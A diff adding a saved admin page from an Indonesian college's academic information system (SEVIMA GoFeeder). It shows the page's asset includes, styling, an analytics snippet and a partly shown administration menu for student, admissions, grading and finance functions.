@@ -1,0 +1,907 @@
+
+<!DOCTYPE html>
+<!--[if IE 8]> <html lang="en" class="ie8 no-js"> <![endif]-->
+<!--[if IE 9]> <html lang="en" class="ie9 no-js"> <![endif]-->
+<!--[if !IE]><!-->
+<html lang="en">
+    <!--<![endif]-->
+    <!-- BEGIN HEAD -->
+
+<head>
+    <meta charset="utf-8" />
+    <title>Sevima GoFeeder by SEVIMA  - Import Data Aktivitas Mahasiswa (Skripsi, Tugas Akhir, Tesis)</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <meta content="" name="description" />
+    <meta content="" name="author" />
+    <!-- BEGIN LAYOUT FIRST STYLES -->
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/css/fonts.css" rel="stylesheet" type="text/css" />
+    <!-- END LAYOUT FIRST STYLES -->
+    <!-- BEGIN GLOBAL MANDATORY STYLES -->
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/uniform/css/uniform.default.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-switch/css/bootstrap-switch.min.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-clockpicker.min.css" rel="stylesheet" type="text/css" />
+    <!-- END GLOBAL MANDATORY STYLES -->
+    <!-- BEGIN PAGE LEVEL PLUGINS -->
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-fileinput/bootstrap-fileinput.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-datepicker/css/bootstrap-datepicker3.min.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/datatables/datatables.min.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/datatables/plugins/bootstrap/datatables.bootstrap.css" rel="stylesheet" type="text/css" />
+    <!-- END PAGE LEVEL PLUGINS -->
+    <!-- BEGIN THEME GLOBAL STYLES -->
+    <link rel="stylesheet" href="http://siakad.stikessurabaya.ac.id/application/assets/css/select2.min.css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/css/components.min.css" rel="stylesheet" id="style_components" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/css/plugins.min.css" rel="stylesheet" type="text/css" />
+    <!-- END THEME GLOBAL STYLES -->
+    <!-- BEGIN PAGE LEVEL STYLES -->
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/pages/css/profile.min.css" rel="stylesheet" type="text/css" />
+    <!-- END PAGE LEVEL STYLES -->
+    <!-- BEGIN THEME LAYOUT STYLES -->
+    <!-- <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout5/css/layout.min.css" rel="stylesheet" type="text/css" /> -->
+    <!-- <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout5/css/custom.min.css" rel="stylesheet" type="text/css" /> -->
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout3/css/layout.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout3/css/themes/default.css" rel="stylesheet" type="text/css" id="style_color" />
+    <!-- END THEME LAYOUT STYLES -->
+    <link rel="shortcut icon" href="http://siakad.stikessurabaya.ac.id/uploads/favicon.png" />
+
+    <link rel="stylesheet" href="http://siakad.stikessurabaya.ac.id/application/assets/css/jquery-ui.css">
+	
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout3/css/custom.css" rel="stylesheet" type="text/css" />
+
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout3/css/responsive.css" rel="stylesheet" type="text/css" />
+    <link href="http://siakad.stikessurabaya.ac.id/application/assets/css/spinner.css" rel="stylesheet" type="text/css" />
+    <!-- END THEME LAYOUT SCRIPTS -->
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/jquery.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/jquery.print.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/jquery-ui.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/select2.min.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/jquery/jquery.validationEngine.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/jquery/jquery.validationEngine-en.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/jquery/jquery.validate.min.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/jquery.mask.min.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/bootstrap/js/bootstrap.min.js"></script>
+
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/jquery-slimscroll/jquery.slimscroll.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/scripts/app.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/main.js"></script>
+
+    <!--[if lt IE 9]>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/respond.min.js"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/excanvas.min.js"></script>
+    <![endif]-->
+    <!-- BEGIN CORE PLUGINS -->
+    <!-- <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap/js/bootstrap.min.js" type="text/javascript"></script> -->
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/js.cookie.min.js" type="text/javascript"></script>
+
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/jquery.blockui.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/uniform/jquery.uniform.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-switch/js/bootstrap-switch.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/jquery-validation/js/jquery.validate.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/jquery-validation/js/additional-methods.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js" type="text/javascript"></script>
+    
+    <!-- END CORE PLUGINS -->
+    <!-- BEGIN THEME GLOBAL SCRIPTS -->
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-datepicker/js/bootstrap-datepicker.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-clockpicker.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-growl/jquery.bootstrap-growl.min.js" type="text/javascript"></script>
+    <!-- END THEME GLOBAL SCRIPTS -->
+    <!-- BEGIN PAGE LEVEL SCRIPTS -->
+    <!--<script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/pages/scripts/dashboard.min.js" type="text/javascript"></script>-->
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/bootstrap-fileinput/bootstrap-fileinput.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/scripts/datatable.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/datatables/datatables.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/global/plugins/datatables/plugins/bootstrap/datatables.bootstrap.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/pages/scripts/table-datatables-managed.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/pages/scripts/ui-bootstrap-growl.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/pages/scripts/form-validation.min.js" type="text/javascript"></script>
+    <!-- END PAGE LEVEL SCRIPTS -->
+    <!-- BEGIN THEME LAYOUT SCRIPTS -->
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout3/scripts/layout.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/layout3/scripts/demo.min.js" type="text/javascript"></script>
+    <script src="http://siakad.stikessurabaya.ac.id/application/assets/metronic/assets/layouts/global/scripts/quick-sidebar.min.js" type="text/javascript"></script>
+    
+    <script type="text/javascript">
+        $(function () {
+            $('.date-picker').datepicker({
+                autoclose: true,
+            });
+        });
+    </script>
+
+    
+    <title>Sevima GoFeeder by SEVIMA  - Import Data Aktivitas Mahasiswa (Skripsi, Tugas Akhir, Tesis)</title>
+    <style type="text/css">
+        .card-berita{
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .card-berita img{
+            width: 100%;
+            height: 120px;
+            object-fit: cover;
+        }
+        .ribbon-biru{
+            background-color: #337ab7;
+            padding: 10px;
+            color: #fff;
+            width: 100%;
+            text-align: center;
+            font-size: 16px;
+        }
+        .ribbon-merah{
+            background-color: #C0392B;
+            padding: 10px;
+            color: #fff;
+            width: 100%;
+            text-align: center;
+            font-size: 16px;
+        }
+        .card-desc{
+            margin-left: -20px;
+        }
+        @media (max-width: 768px) {
+        .card-desc{
+            margin-left: 0 !important;
+        }
+        .card-berita img{
+            width: 100%;
+            height: auto;
+        }
+        }
+        .judul-berita{
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .judul-berita:hover{
+            text-decoration: none;
+        }
+        .card-berita h4{
+            overflow:hidden;
+            max-height:200px;
+            display: -webkit-box;
+            -webkit-line-clamp: 1;
+            -webkit-box-orient: vertical;
+            max-width: 100%;
+            padding: 0px 10px 0px 10px;
+        }
+        .card-berita p{
+            overflow:hidden;
+            max-height:200px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            font-size: 14px;
+            margin-top: 0;
+            padding: 0px 10px 0px 10px;
+        }
+        .number-flow{
+            position: absolute;
+            top: 15px;
+            left: 30px;
+            padding: 5px 15px;
+            font-size: 18px;
+            color: #fff;
+            background-color: red;
+            z-index: 2;
+        }
+        th{
+            text-align: center;
+            vertical-align: middle;
+        }
+        
+        /* Extra small devices (phones, 600px and down) */
+        @media only screen and (max-width: 600px) {
+          .scroll-to-top {
+            bottom: 6%;
+          }
+          .faq-button > i,.faq-button > a {
+              display: inline-block;
+              font-size: 20px;
+              opacity: 0.7;
+              filter: alpha(opacity=70);
+          }
+        }
+
+        /* Small devices (portrait tablets and large phones, 600px and up) */
+        @media only screen and (min-width: 600px) {
+          .scroll-to-top {
+            bottom: 6%;
+          }
+          .faq-button > i,.faq-button > a {
+              display: inline-block;
+              font-size: 20px;
+              opacity: 0.7;
+              filter: alpha(opacity=70);
+          }
+        }
+
+        /* Large devices (laptops/desktops, 992px and up) */
+        @media only screen and (min-width: 1200px) {
+          .scroll-to-top {
+            bottom: 7%;
+          }
+          .faq-button > i,.faq-button > a {
+              display: inline-block;
+              font-size: 20px;
+              opacity: 0.7;
+              filter: alpha(opacity=70);
+          }
+        }
+
+        /* Extra large devices (large laptops and desktops, 1200px and up) */
+        @media only screen and (min-width: 1920px) {
+          .scroll-to-top {
+            bottom: 5%;
+          }
+          .faq-button > i,.faq-button > a {
+              display: inline-block;
+              font-size: 20px;
+              opacity: 0.7;
+              filter: alpha(opacity=70);
+          }
+        }
+        
+        .faq-button{ 
+            padding: 5px 0; 
+            text-align: center;
+            position: fixed;
+            z-index: 10001;
+            bottom: 5px;
+            right: 20px;
+        }
+        .faq-button a:hover{
+            opacity: 1;
+            color: #657383;
+            text-decoration: none;
+        }
+    </style>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+          <script async src="https://www.googletagmanager.com/gtag/js?id=UA-121961242-1"></script>
+        <script>
+        // console.log('Sekolah Tinggi Ilmu Kesehatan Surabaya');
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('set', {
+        'user_id': '073146-Admin-adminstikessby'
+      }); // Set the user ID using signed-in user_id.
+
+      gtag('config', 'UA-121961242-1',{
+        'custom_map' : {
+            'dimension1' : 'PT',
+            'dimension2' : 'User',
+            'metric1' : 'Pageviews'
+        }
+      });
+
+      gtag('event', 'push_custom_var', {
+        'PT' : 'Sekolah Tinggi Ilmu Kesehatan Surabaya',
+        'User' : '073146-Admin-adminstikessby',
+        'Pageviews' :1
+      });
+    </script>
+
+    <!-- CKEDITOR 4 LOKAL, tidak bisa embed -->
+    <!-- <script type="text/javascript" src="http://siakad.stikessurabaya.ac.id/application/assets/ckeditor/ckeditor.js"></script> -->
+    <!-- CKEDITOR 4 ONLINE, bisa embed, harus pakai internet -->
+    <script src="https://cdn.ckeditor.com/4.13.0/standard-all/ckeditor.js"></script>
+    
+    <script type="text/javascript" src="http://siakad.stikessurabaya.ac.id/application/assets/ckeditor/kcfinder/kcfinder.js"></script>
+
+</head>
+<!-- END HEAD -->
+
+<body class="page-container-bg-solid page-boxed">
+    <div class="loading" style="display: none;">Loading&#8230;</div>
+    <!-- BEGIN HEADER -->
+    <div class="page-header" style="margin: 0 auto">
+        <!-- BEGIN HEADER TOP -->
+        <div class="page-header-top">
+            <div class="container-fluid container-lf-space">
+                <!-- BEGIN LOGO -->
+                <div class="page-logo">
+                    <a href="http://siakad.stikessurabaya.ac.id/index.php/home">
+                                                    <img src="http://siakad.stikessurabaya.ac.id/uploads/logoPT.png" alt="logo" class="logo-default">
+                                            </a>
+                </div>
+                <!-- END LOGO -->
+
+                <!-- BEGIN UNIV -->
+                <div class="page-text">
+                                                                        <h4 style="margin-top:4%;"><strong>SEKOLAH TINGGI ILMU KESEHATAN SURABAYA</strong></h4>
+                                                            </div>
+                <!-- END UNIV -->
+
+                <!-- BEGIN RESPONSIVE MENU TOGGLER -->
+                <a href="javascript:;" class="menu-toggler"></a>
+                <!-- END RESPONSIVE MENU TOGGLER -->
+
+                <div class="top-menu">
+                    <ul class="nav navbar-nav pull-right">
+                        <li class="dropdown dropdown-user dropdown-dark">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-close-other="true" aria-expanded="true">
+                                <img alt="" class="img-circle" src="http://siakad.stikessurabaya.ac.id/uploads/adminstikessby3.png">
+                                <span class="username username-hide-mobile">adminstikessby <i class="fa fa-angle-down"></i></span>
+                            </a>
+                            <ul class="dropdown-menu dropdown-menu-default">
+                                <li>
+                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/gantifoto">
+                                        <i class="icon-picture"></i> Ubah Foto Profil
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/gantipassword">
+                                        <i class="icon-key"></i> Ubah Password
+                                    </a>
+                                </li>
+                                <li class="divider"> </li>
+                                <li>
+                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/logout">
+                                        <i class="fa fa-sign-out"></i> Log Out
+                                    </a>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- END HEADER TOP -->
+
+        <!-- BEGIN HEADER MENU -->
+        <div class="page-header-menu">
+            <div class="container-fluid container-lf-space">
+                <div class="caption-right pull-right">
+                    Semester aktif : <h4 class="mar0">2019/2020 Genap</h4>
+                </div>
+                <!-- BEGIN MEGA MENU -->
+                <div class="hor-menu">
+                                        <ul class="nav navbar-nav">
+                        <li class="classic-menu-dropdown">
+                            <a href="http://siakad.stikessurabaya.ac.id/index.php/home"> <i class="icon-home"></i> Home</a>
+                        </li>
+                                                    <li class="menu-dropdown classic-menu-dropdown">
+                                <a href="javascript:;">
+                                    <i class="glyphicon glyphicon-user"></i> SDM
+                                    <span class="arrow"></span>
+                                </a>
+                                <ul class="dropdown-menu pull-left">
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/sdm/internal" class="nav-link  "> Dosen Internal </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/sdm/luar" class="nav-link  "> Dosen Luar </a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="menu-dropdown classic-menu-dropdown">
+                                <a href="javascript:;">
+                                    <i class="glyphicon glyphicon-education"></i> PMB
+                                    <span class="arrow"></span>
+                                </a>
+                                <ul class="dropdown-menu pull-left">
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/setting" class="nav-link  "> Pengaturan PMB </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/tes" class="nav-link  "> Jenis Tes </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/berkas" class="nav-link  "> Jenis Berkas </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/periodePendaftaran" class="nav-link  "> Periode Pendaftaran </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/lst" class="nav-link  "> Daftar Calon Mahasiswa Baru </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/generatenim" class="nav-link  "> Set NIM Pendaftar Kolektif </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/export" class="nav-link  "> Export ke Data Mahasiswa </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/pmb/ug" class="nav-link  "> User Guide PMB </a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="menu-dropdown classic-menu-dropdown">
+                                <a href="javascript:;">
+                                    <i class="fa fa-mortar-board"></i> Akademik
+                                    <span class="arrow"></span>
+                                </a>
+                                <ul class="dropdown-menu pull-left">
+                                    <li class="dropdown-submenu">
+                                        <a href="javascript:;" class="nav-link  "> Mahasiswa </a>
+                                        <ul class="dropdown-menu pull-left sub-menu">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/importmhs" class="nav-link  "> Import Data Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/mahasiswa" class="nav-link  "> Daftar Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/kuliah_mahasiswa" class="nav-link  "> Set Status Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/mahasiswa/temp_mahasiswa" class="nav-link  "> Set Sistem Kuliah Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/tagihan/checklist_krs" class="nav-link  "> Dispensasi KRS Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/tagihan/checklist_kartuujian" class="nav-link  "> Dispensasi Kartu Ujian </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/list_pembayaran/validasi" class="nav-link  "> Validasi KRS Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/importaktmhs" class="nav-link  "> Import Aktivitas Mahasiswa </a>
+                                            </li>
+                                                                                            <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/dashboardp/mhsbelumkrs" class="nav-link  "> Daftar Mahasiswa Belum KRS </a>
+                                                </li>
+                                                                                        <li class=" ">
+                                              <a href="http://siakad.stikessurabaya.ac.id/index.php/transkripawal" class="nav-link  "> Hitung Transkrip </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class="dropdown-submenu">
+                                        <a href="javascript:;" class="nav-link  "> Perkuliahan </a>
+                                        <ul class="dropdown-menu pull-left sub-menu">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/kelaskolektif" class="nav-link  "> Kelas & Jadwal Perkuliahan </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/nilai" class="nav-link  "> Nilai Perkuliahan </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/absensi/listabsensi" class="nav-link  "> Absensi Perkuliahan </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/dosen/pelimpahan" class="nav-link  "> Pelimpahan Mata Kuliah </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/dosen/set_dosenwali" class="nav-link  "> Dosen Wali </a>
+                                    </li>
+                                    <li class="dropdown-submenu">
+                                        <a href="javascript:;" class="nav-link  "> Kelulusan & Yudisium </a>
+                                        <ul class="dropdown-menu pull-left sub-menu">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/importlulus" class="nav-link  "> Import Kelulusan Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/mahasiswa_yudisium/setMhsLulus" class="nav-link  "> Set Yudisium Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/mahasiswa_yudisium" class="nav-link  "> Daftar Mahasiswa Yudisium</a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="menu-dropdown classic-menu-dropdown">
+                                <a href="javascript:;">
+                                    <i class="icon-drawer"></i> Data
+                                    <span class="arrow"></span>
+                                </a>
+                                <ul class="dropdown-menu pull-left">
+                                    <li class="dropdown-submenu">
+                                        <a href="javascript:;" class="nav-link  ">Referensi</a>
+                                        <ul class="dropdown-menu pull-left">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/sistemkuliah" class="nav-link  "> Sistem Kuliah </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/ruang_kuliah" class="nav-link  "> Ruang Perkuliahan </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/unsur_nilai" class="nav-link  "> Unsur Penilaian </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/unsur_nilai/bobot" class="nav-link  "> Bobot Penilaian </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/jabatan" class="nav-link  "> Jabatan </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/unit_jabatan" class="nav-link  "> Unit Jabatan </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/pendaftaran/periode_yudisium" class="nav-link  "> Periode Yudisium </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/wilayah" class="nav-link  "> Wilayah </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/master/sekolah" class="nav-link  "> Asal SMA/SMK </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class="dropdown-submenu">
+                                        <a href="javascript:;" class="nav-link  "> Kuesioner </a>
+                                        <ul class="dropdown-menu pull-left sub-menu">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/kuesioner" class="nav-link  "> Aspek Penilaian Dosen</a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/kuesioner/skala" class="nav-link  "> Skala Penilaian Dosen</a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/kuesioner/hasil" class="nav-link  "> Hasil Kuesioner Dosen</a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/kuesioner/hasilkelas" class="nav-link  "> Hasil Kuesioner Per Kelas</a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                                                            <li class="dropdown-submenu">
+                                            <a href="javascript:;" class="nav-link  "> Tracer Study </a>
+                                            <ul class="dropdown-menu pull-left sub-menu">
+                                                <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/tracers/lstjawaban" class="nav-link  "> Daftar Jawaban</a>
+                                                </li>
+                                                <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/tracers/lst" class="nav-link  "> Aspek / Pertanyaan</a>
+                                                </li>
+                                                <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/tracers/hasilperiode" class="nav-link  "> Hasil Per Periode</a>
+                                                </li>
+                                                <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/tracers/hasilalumnus" class="nav-link  "> Hasil Per Alumnus</a>
+                                                </li>
+                                            </ul>
+                                        </li>
+                                    
+                                    
+
+                                    <li class="dropdown-submenu">
+                                        <a href="javascript:;" class="nav-link  ">Keuangan</a>
+                                        <ul class="dropdown-menu pull-left">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/tagihan" class="nav-link  "> Daftar Tagihan </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/pembayaran" class="nav-link  "> Daftar Pembayaran </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/berita" class="nav-link  "> Daftar Berita </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/mahasiswa_pt/genKTMKolektif" class="nav-link  "> Generate KTM Kolektif</a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/dosen/genKTDKolektif" class="nav-link  "> Generate KTD Kolektif</a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="menu-dropdown classic-menu-dropdown">
+                                <a href="javascript:;">
+                                    <i class="icon-printer"></i> Laporan
+                                    <span class="arrow"></span>
+                                </a>
+                                <ul class="dropdown-menu pull-left">
+                                    <li class="dropdown-submenu">
+                                        <a class="nav-link  "> Mahasiswa </a>
+                                        <ul class="dropdown-menu pull-left sub-menu">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/krsmhsparam" class="nav-link  "> KRS Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/khsmhsparam" class="nav-link  "> KHS Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rhsmhsparam" class="nav-link  "> RHS Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/tranksripparam" class="nav-link  "> Transkrip Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/kartuujianparam" class="nav-link  "> Kartu Ujian Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/kartuujianangkatanparam" class="nav-link  "> Kartu Ujian Mahasiswa Per Angkatan</a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekapsistemkuliahparam" class="nav-link  "> Rekap Sistem Kuliah Mahasiswa</a>
+                                            </li>
+
+                                            <li class=" " style="display: block">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/exportmhsparam" class="nav-link  "> Export Data Mahasiswa</a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class="dropdown-submenu">
+                                        <a class="nav-link  "> Kelas Perkuliahan </a>
